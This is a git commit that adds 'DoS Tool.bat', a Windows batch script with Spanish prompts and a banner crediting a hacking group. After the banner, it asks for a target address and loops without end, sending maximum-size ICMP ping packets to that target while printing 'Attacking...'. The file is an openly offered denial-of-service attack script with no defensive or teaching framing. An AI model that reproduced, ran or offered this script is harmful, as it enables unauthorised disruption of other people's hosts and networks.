cd34cfbfa05fe71661f80c61cb0d0fff0af0678f
Ananajnsajsbnabisaiduhsidsd <86183482+Ananajnsajsbnabisaiduhsidsd@users.noreply.github.com>
2021-06-20 10:26:42 +0200

    Add files via upload

---
+++ DoS Tool.bat
@@ -0,0 +1,38 @@
+ÿþ&cls
+@echo off
+title #Hxx$quad - DoS Tool
+echo.
+echo.
+echo  DOS TOOL  DOS TOOL      
+echo   DOS TOOL  DOS TOOL 
+echo    DOS TOOL  DOS TOOL 
+echo     DOS TOOL  DOS TOOL 
+echo      DOS TOOL  DOS TOOL 
+echo                                         [ By Carry ] 
+echo          DOS Tool By Hxx$quad
+echo           DOS Tool By Hxx$quad
+echo            DOS Tool By Hxx$quad
+echo             DOS Tool By Hxx$quad
+echo              DOS Tool By Hxx$quad
+echo               DOS Tool By Hxx$quad
+echo                DOS Tool By Hxx$quad
+echo                 DOS Tool By Hxx$quad
+echo                  DOS Tool By Hxx$quad 
+echo -------------------------------------------------
+echo        Presiona alguna tecla para seguir 
+echo -------------------------------------------------
+echo.
+echo.
+pause >nul
+:fnc0
+cls
+echo           .      #Hxx$quad         .        
+echo           .      #Carry            .        
+echo           .      #.gg/hxxsquad     .              
+echo.
+echo.
+set /p objdos=Introduce un objetivo para hacer DoS : 
+:bucle
+ping -l 65500 -n 1 -w 75 %objdos% >nul
+echo Enviando paquetes ICMP a : %objdos% - Attacking...
+goto bucle
